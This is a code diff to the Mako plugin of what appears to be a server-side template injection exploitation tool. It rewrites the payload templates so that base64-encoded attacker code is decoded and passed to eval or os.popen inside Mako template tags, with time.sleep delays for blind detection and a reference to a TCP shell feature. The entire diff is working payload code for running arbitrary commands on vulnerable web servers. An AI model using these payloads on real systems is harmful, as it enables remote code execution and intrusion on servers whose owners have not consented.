@@ -35,8 +35,8 @@ class Mako(Plugin):
             'bool_false' : 'False'
         },
         'evaluate_blind' : {
-            'call': 'inject',
-            'evaluate_blind': """<%% %(code)s and __import__("time").sleep(%(delay)i) %%>"""
+            'call': 'evaluate',
+            'evaluate_blind': """eval(__import__('base64').urlsafe_b64decode('%(code_b64)s')) and __import__('time').sleep(%(delay)i)"""
         },
         'tcp_shell' : {
             'call' : 'execute_blind',
@@ -48,11 +48,11 @@ class Mako(Plugin):
         },
         'execute_blind' : {
             'call': 'evaluate_blind',
-            'execute_blind': """import os; x=os.popen("%(code)s && %(delay)i").read()"""
+            'execute_blind': """__import__('os').popen(__import__('base64').urlsafe_b64decode('%(code_b64)s')).read()"""
         },
         'execute' : {
             'call' : 'render',
-            'execute' : '<%% import os; x=os.popen("%(code)s").read() %%>${x}'
+            'execute' : """<%% x=__import__('os').popen(__import__('base64').urlsafe_b64decode('%(code_b64)s')).read() %%>${x}"""
         }
 
     }
